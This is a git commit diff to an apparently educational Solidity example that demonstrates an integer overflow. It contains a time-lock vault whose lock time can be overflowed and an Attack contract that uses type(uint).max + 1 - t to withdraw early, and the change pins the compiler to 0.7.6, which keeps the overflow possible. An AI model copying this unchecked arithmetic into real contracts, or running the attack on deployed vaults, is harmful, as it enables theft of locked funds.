c5ec944d0d73bf716607275def48c6f0645691ea
Perelyn Sama <64838956+Perelyn-sama@users.noreply.github.com>
2022-05-16 18:38:08 +0100

    tweaks

--- src/ArithmeticFlow.sol
+++ src/ArithmeticFlow.sol
@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity >=0.4.22 <0.9.0;
+pragma solidity ^0.7.6;
 
 // This contract is designed to act as a time vault.
 // User can deposit into this contract but cannot withdraw for atleast a week.
@@ -17,26 +17,23 @@ before the 1 week waiting period.
 */
 
 contract TimeLock {
-    mapping(address => uint256) public balances;
-    mapping(address => uint256) public lockTime;
+    mapping(address => uint) public balances;
+    mapping(address => uint) public lockTime;
 
     function deposit() external payable {
         balances[msg.sender] += msg.value;
         lockTime[msg.sender] = block.timestamp + 1 weeks;
     }
 
-    function increaseLockTime(uint256 _secondsToIncrease) public {
+    function increaseLockTime(uint _secondsToIncrease) public {
         lockTime[msg.sender] += _secondsToIncrease;
     }
 
     function withdraw() public {
         require(balances[msg.sender] > 0, "Insufficient funds");
-        require(
-            block.timestamp > lockTime[msg.sender],
-            "Lock time not expired"
-        );
+        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");
 
-        uint256 amount = balances[msg.sender];
+        uint amount = balances[msg.sender];
         balances[msg.sender] = 0;
 
         (bool sent, ) = msg.sender.call{value: amount}("");
@@ -63,7 +60,7 @@ contract Attack {
         so x = type(uint).max + 1 - t
         */
         timeLock.increaseLockTime(
-            type(uint256).max + 1 - timeLock.lockTime(address(this))
+            type(uint).max + 1 - timeLock.lockTime(address(this))
         );
         timeLock.withdraw();
     }
